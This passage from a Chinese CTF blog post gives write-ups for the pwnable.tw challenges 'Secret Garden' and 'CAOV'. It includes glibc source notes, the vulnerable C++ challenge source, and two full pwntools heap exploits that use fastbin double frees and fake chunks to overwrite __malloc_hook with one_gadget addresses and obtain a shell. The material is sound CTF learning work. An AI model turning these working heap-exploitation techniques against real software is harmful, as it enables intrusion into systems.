<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__backtrace (void **array, int size)</span><br><span class="line">&#123;</span><br><span class="line">  struct trace_arg arg = &#123; .array = array, .cfa = 0, .size = size, .cnt = -1 &#125;;</span><br><span class="line"></span><br><span class="line">  if (size &lt;= 0)</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">#ifdef SHARED</span><br><span class="line">  __libc_once_define (static, once);</span><br><span class="line"></span><br><span class="line">  __libc_once (once, init);</span><br><span class="line">  if (unwind_backtrace == NULL)</span><br><span class="line">    return 0;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  unwind_backtrace (backtrace_helper, &amp;arg);</span><br><span class="line"></span><br><span class="line">  /* _Unwind_Backtrace seems to put NULL address above</span><br><span class="line">     _start.  Fix it up here.  */</span><br><span class="line">  if (arg.cnt &gt; 1 &amp;&amp; arg.array[arg.cnt - 1] == NULL)</span><br><span class="line">    --arg.cnt;</span><br><span class="line">  return arg.cnt != -1 ? arg.cnt : 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><figcaption><span>(once, init);```中的init如下，调用了```__libc_dlopen ("libgcc_s.so.1")```，又因为```__libc_dlopen ("libgcc_s.so.1")```这个函数需要malloc为它分配内存，因此又会调用malloc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>static void<br>init (void)<br>{<br>  libgcc_handle = __libc_dlopen (“libgcc_s.so.1”);</p>
<p>  if (libgcc_handle == NULL)<br>    return;</p>
<p>  unwind_backtrace = __libc_dlsym (libgcc_handle, “_Unwind_Backtrace”);<br>  unwind_getip = __libc_dlsym (libgcc_handle, “_Unwind_GetIP”);<br>  if (unwind_getip == NULL)<br>    unwind_backtrace = NULL;<br>  unwind_getcfa = (__libc_dlsym (libgcc_handle, “_Unwind_GetCFA”)<br>          ?: dummy_getcfa);<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">整个调用关系如下图</span><br><span class="line"></span><br><span class="line">![image-20211108114616202](image-20211108114616202.png)</span><br><span class="line"></span><br><span class="line">可以看见这时候会先执行malloc_hook，可以看见栈上有大量的0，满足了onegadget的要求。</span><br><span class="line"></span><br><span class="line">![image-20211108114744647](image-20211108114744647.png)</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>#io=process(‘./secretgarden’,env={‘LD_PRELOAD’:’./libc_64.so.6’})<br>io=remote(‘chall.pwnable.tw’ ,10203)<br>#io=process(‘./secretgarden’)<br>elf=ELF(‘./secretgarden’)<br>libc=ELF(‘./libc_64.so.6’)<br>#libc=ELF(‘./libc-2.23.so’)<br>context.log_level=’debug’</p>
<p>def add(length,name,color):<br>    io.sendlineafter(‘choice : ‘,’1’)<br>    io.sendlineafter(‘Length of the name :’,str(length))<br>    io.sendafter(‘name of flower :’,name)<br>    io.sendlineafter(‘color of the flower :’,color)</p>
<p>def show():<br>    io.sendlineafter(‘choice : ‘,’2’)</p>
<p>def dele(index):<br>    io.sendlineafter(‘choice : ‘,’3’)<br>    io.sendlineafter(‘Which flower do you want to remove from the garden:’,str(index))</p>
<p>def exp():<br>    add(0x98,’0’,’0’)<br>    add(0x18,’1’,’1’)<br>    dele(0)<br>    add(0x68,’a’*8,’0’)<br>    show()<br>    malloc_hook=u64(io.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))-88-16<br>    libc_base=malloc_hook-libc.symbols[‘__malloc_hook’]<br>    realloc=libc_base+libc.symbols[‘__libc_realloc’]<br>    print(‘libc_base’,hex(libc_base))<br>    onegadget=[0x45216,0x4526a,0xcc543,0xcc618,0xef6c4,0xef6d0,0xf0567,0xf5b10,0xf0897]</p>
<pre><code>add(0x68,&#39;2&#39;,&#39;2&#39;)
add(0x68,&#39;3&#39;,&#39;3&#39;)
dele(2)
dele(3)
dele(2)
add(0x68,p64(malloc_hook-0x23),&#39;2&#39;)
add(0x68,&#39;3&#39;,&#39;3&#39;)
add(0x68,&#39;4&#39;,&#39;4&#39;)
add(0x68,&#39;a&#39;*(0x13)+p64(onegadget[8]+libc_base),&#39;5&#39;)
dele(4)

#gdb.attach(io,gdb_args=[&quot;-d&quot;,&quot;../../../pwndbg/glibc-2.23/malloc&quot;])
dele(4)
#io.sendlineafter(&#39;choice : &#39;,&#39;1&#39;)
io.interactive()
</code></pre>
<p>exp()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 10.CAOV</span><br><span class="line"></span><br><span class="line">近段时间遇到了好多C++pwn题，但由于太菜，每次都看不懂，因此想在网上找C++pwn题的源码对照ida学习c++pwn，但网上的这种资料太少,四处碰壁后还是靠企鹅才找到了源码。以下是源码。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>/* g++ -std=c++11 -Wl,-z,relro,-z,now -o caov caov.cpp */</p>
<p>#include &lt;bits/stdc++.h&gt;<br>#include &lt;unistd.h&gt;</p>
<p>using namespace std;</p>
<p>class Data;</p>
<p>Data *D;<br>char name[160];</p>
<p>class Data<br>{<br>    public:<br>        Data():key(NULL) , value(0), change_count(0){ init_time(); }<br>        Data(string k, int v)<br>        {<br>            key = new char[k.length() + 1];<br>            strcpy(key, k.c_str());<br>            value = v;<br>            change_count = 0;<br>            update_time();<br>        }<br>        Data(const Data &amp;obj)<br>        {<br>            key = new char[strlen(obj.key)+1];<br>            strcpy(key, obj.key);<br>            value = obj.value;<br>            change_count = obj.change_count;<br>            year  = obj.year;<br>            month = obj.month;<br>            day   = obj.day;<br>            hour  = obj.hour;<br>            min   = obj.min;<br>            sec   = obj.sec;<br>        }<br>        Data operator=(const Data &amp;rhs)<br>        {<br>            key = new char[strlen(rhs.key)+1];<br>            strcpy(key, rhs.key);<br>            value = rhs.value;<br>            change_count = rhs.change_count;<br>            year  = rhs.year;<br>            month = rhs.month;<br>            day   = rhs.day;<br>            hour  = rhs.hour;<br>            min   = rhs.min;<br>            sec   = rhs.sec;<br>        }<br>        void edit_data()<br>        {<br>            if(change_count == 10)<br>            {<br>                cout &lt;&lt; “You can only edit your data 10 times at most.” &lt;&lt; endl;<br>                cout &lt;&lt; “Bye ._.\~/“ &lt;&lt; endl;<br>                exit(0);<br>            }<br>            int old_len = strlen(key);<br>            unsigned int new_len = 0;<br>            cout &lt;&lt; “New key length: “;<br>            cin  &gt;&gt; new_len;<br>            getchar();<br>            if(new_len == 0 || new_len &gt; 1000)<br>            {<br>                cout &lt;&lt; “Invalid key length” &lt;&lt; endl;<br>                return;<br>            }<br>            if (new_len &gt; old_len) key = new char[new_len+1];<br>            set_data(new_len);<br>            change_count += 1;<br>        }<br>        void set_data(unsigned int n)<br>        {<br>            cout &lt;&lt; “Key: “;<br>            cin.getline(key, n+1); // read n byte + 1 null byte ( auto append )<br>            cout &lt;&lt; “Value: “;<br>            cin &gt;&gt; value;<br>            getchar();<br>            update_time();<br>        }<br>        void update_time()<br>        {<br>            time_t cur_time = time(NULL);<br>            struct tm *now = localtime(&amp;cur_time);<br>            year = now-&gt;tm_year + 1900;<br>            month = now-&gt;tm_mon + 1;<br>            day = now-&gt;tm_mday;<br>            hour = now-&gt;tm_hour;<br>            min = now-&gt;tm_min;<br>            sec = now-&gt;tm_sec;<br>        }<br>        void info()<br>        {<br>            cout &lt;&lt; “Key: “ &lt;&lt; key &lt;&lt; endl;<br>            cout &lt;&lt; “Value: “ &lt;&lt; value &lt;&lt; endl;<br>            cout &lt;&lt; “Edit count: “ &lt;&lt; change_count &lt;&lt; endl;<br>            cout &lt;&lt; “Last update time: “;<br>            printf(“%d-%d-%d %d:%d:%d\n”, year, month, day, hour, min, sec);<br>        }<br>        ~Data()<br>        {<br>            delete[] key;<br>            key = nullptr;<br>            value = 0;<br>            change_count = 0;<br>            init_time();<br>        }</p>
<pre><code>private:
    char *key;
    long value;
    long change_count;
    int year;
    int month;
    int day;
    int hour;
    int min;
    int sec;
    void init_time()
    &#123;
        year  = 0;
        month = 0;
        day   = 0;
        hour  = 0;
        min   = 0;
        sec   = 0;
    &#125;
</code></pre>
<p>};</p>
<p>void set_name()<br>{<br>    char tmp[160]={};<br>    char c;<br>    cout &lt;&lt; “Enter your name: “;<br>    int cnt = 0;<br>    while(1)<br>    {<br>        int len = read(0, &amp;c, 1);<br>        if(len != 1)<br>        {<br>            cout &lt;&lt; “Read error” &lt;&lt; endl;<br>            exit(-1);<br>        }<br>        tmp[cnt++] = c;<br>        if(c == ‘\n’ || cnt == 150)<br>        {<br>            tmp[cnt-1] = ‘\0’;<br>            break;<br>        }<br>    }<br>    memcpy(name, tmp, cnt);<br>}</p>
<p>void edit()<br>{<br>    Data old;<br>    old = *D;<br>    D-&gt;edit_data();<br>    cout &lt;&lt; “\nYour data info before editing:” &lt;&lt; endl;<br>    old.info();<br>    cout &lt;&lt; “\nYour data info after editing:” &lt;&lt; endl;<br>    D-&gt;info();<br>}</p>
<p>void playground()<br>{<br>    int choice = 0;<br>    while(1)<br>    {<br>        cout &lt;&lt; “\nMenu” &lt;&lt; endl;<br>        cout &lt;&lt; “1. Show name &amp; data” &lt;&lt; endl;<br>        cout &lt;&lt; “2. Edit name &amp; data” &lt;&lt; endl;<br>        cout &lt;&lt; “3. Exit” &lt;&lt; endl;<br>        cout &lt;&lt; “Your choice: “;<br>        cin &gt;&gt; choice;<br>        getchar();<br>        switch(choice)<br>        {<br>            case 1:<br>                cout &lt;&lt; “\nYour name is : “&lt;&lt; name &lt;&lt; endl;<br>                cout &lt;&lt; “Your data :” &lt;&lt; endl;<br>                D-&gt;info();<br>                break;<br>            case 2:<br>                set_name();<br>                edit();<br>                break;<br>            case 3:<br>                cout &lt;&lt; “Bye !” &lt;&lt; endl;<br>                return;<br>            default:<br>                cout &lt;&lt; “Invalid choice !” &lt;&lt; endl;<br>                exit(0);<br>        }<br>    }<br>}</p>
<p>int main(int argc, char *argv[])<br>{<br>    setvbuf(stdin,0, 2, 0);<br>    setvbuf(stdout,0, 2, 0);<br>    setvbuf(stderr,0, 2, 0);</p>
<pre><code>string k;
long v;

set_name();
cout &lt;&lt; &quot;Hello ! &quot; &lt;&lt; name &lt;&lt; &quot; !&quot; &lt;&lt; endl;
cout &lt;&lt; &quot;Welcome to Simple key-value DB playground !&quot; &lt;&lt; endl;
cout &lt;&lt; &quot;Please input a key: &quot;;
cin &gt;&gt; k;
cout &lt;&lt; &quot;Please input a value: &quot;;
cin &gt;&gt; v;

D = new Data(k, v);
cout &lt;&lt; &quot;Data create success !&quot; &lt;&lt; endl;
cout &lt;&lt; &quot;Now you can play with your data ^_^&quot; &lt;&lt; endl;

playground();

return 0;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本题的漏洞点在dele的指针是我们可以控制的</span><br><span class="line"></span><br><span class="line">![image-20211123170418374](D:\ABf1ag-blog\source\_posts\pwnable-tw刷题记录\image-20211123170418374.png)</span><br><span class="line"></span><br><span class="line">可以看到v4距离ebp0x50的位置</span><br><span class="line"></span><br><span class="line">![image-20211123170522368](D:\ABf1ag-blog\source\_posts\pwnable-tw刷题记录\image-20211123170522368.png)</span><br><span class="line"></span><br><span class="line">和他共用一个栈帧的函数其中src是我们可控的，也就是说v4可控，因此我们就能够伪造chunk了。</span><br><span class="line"></span><br><span class="line">![image-20211123170611044](D:\ABf1ag-blog\source\_posts\pwnable-tw刷题记录\image-20211123170611044.png)</span><br><span class="line"></span><br><span class="line">exp：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>#io=process(‘./caov’)<br>io=remote(‘chall.pwnable.tw’,10306)<br>elf=ELF(‘./caov’)<br>#libc=elf.libc<br>libc=ELF(‘./libc_64.so.6’)<br>context.log_level=’debug’</p>
<p>def add(name,key,value):<br>    io.sendlineafter(‘Enter your name: ‘,name)<br>    io.sendlineafter(‘input a key: ‘,key)<br>    io.sendlineafter(‘input a value: ‘,value)</p>
<p>def edit(name,length,key,value):<br>    io.sendlineafter(‘Your choice: ‘,’2’)<br>    io.sendlineafter(‘Enter your name: ‘,name)<br>    io.sendlineafter(‘New key length: ‘,str(length))<br>    io.sendafter(‘Key: ‘,key)<br>    io.sendlineafter(‘Value: ‘,value)</p>
<p>def show():<br>    io.sendlineafter(‘Your choice: ‘,’1’)</p>
<p>def exp():<br>    add(‘f1ag’,’a’*0x10,’10’)<br>    payload=p64(0)+p64(0x71)<br>    payload=payload.ljust(0x60,’\x00’)<br>    edit(payload+p64(0x6032d0)*2+p64(0)+p64(0x21),0x7,’b\n’,’20’)<br>    edit(p64(0)+p64(0x71)+p64(0x603288-3),0x67,’c\n’,’30’)<br>    edit(p64(0)+p64(0x71)+p64(0)*6+p64(0x603280)+p64(0x10),0x67,’a’*0xb+p64(0x603300)+’\n’,’30’)<br>    addr=u64(io.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’))<br>    libc_base=addr-libc.symbols[‘<em>IO_2_1_stderr</em>‘]<br>    print(‘libc_base’,hex(libc_base))<br>    free_hook=libc_base+libc.symbols[‘__free_hook’]<br>    system=libc_base+libc.symbols[‘system’]<br>    malloc_hook=libc_base+libc.symbols[‘__malloc_hook’]<br>    gadget=[0x45216,0x4526a,0xef6c4,0xf0567]    </p>
<pre><code>payload=p64(0)+p64(0x71)+p64(0)*6+p64(0x603280)+p64(0x10)+p64(0)
payload=payload.ljust(0x60,&#39;\x00&#39;)    
edit(payload+p64(0x6032d0)*2+p64(0)+p64(0x21),0x10,&#39;\n&#39;,&#39;20&#39;)
edit(p64(0)+p64(0x71)+p64(malloc_hook-0x23),0x67,&#39;\n&#39;,&#39;1&#39;)
#gdb.attach(io)
edit(p64(0)+p64(0x71),0x67,&#39;a&#39;*0x13+p64(gadget[2]+libc_base)+&#39;\n&#39;,&#39;2&#39;)
io.interactive()
</code></pre>
<p>exp()</p>
<pre><code>
</code></pre>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/10/18/%E8%A5%BF%E9%82%AE%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%A0%A1%E8%B5%9B/" rel="prev" title="西邮第二届校赛">
      <i class="fa fa-chevron-left"></i> 西邮第二届校赛
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" rel="next" title="东华杯">
      东华杯 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">pwnable.tw刷题记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-applestore-%E5%81%87unlink%E5%8A%AB%E6%8C%81ebp"><span class="nav-number">1.1.</span> <span class="nav-text">1.applestore(假unlink劫持ebp)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-re-alloc-realloc%E7%9A%84%E5%A6%99%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">2.re-alloc(realloc的妙用)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-tcache-tear-fakechunk%E6%9E%84%E9%80%A0%E9%9C%80%E8%A6%81%E8%BF%9E%E7%BB%AD%E4%B8%89%E4%B8%AA"><span class="nav-number">1.3.</span> <span class="nav-text">3.tcache_tear(fakechunk构造需要连续三个)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-seethefile%EF%BC%88%E4%BC%AA%E9%80%A0IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">4.seethefile（伪造IO_FILE结构体）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Death-Note-alpha-shellcode%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-number">1.5.</span> <span class="nav-text">5.Death Note(alpha_shellcode的编写)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Spirited-Away"><span class="nav-number">1.6.</span> <span class="nav-text">7.Spirited Away</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-BabyStack"><span class="nav-number">1.7.</span> <span class="nav-text">8.BabyStack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Secret-Garden"><span class="nav-number">1.8.</span> <span class="nav-text">9.Secret Garden</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ABf1ag</p>
  <div class="site-description" itemprop="description">CTF to learn,not learn to CTF</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">19</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ABf1ag</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
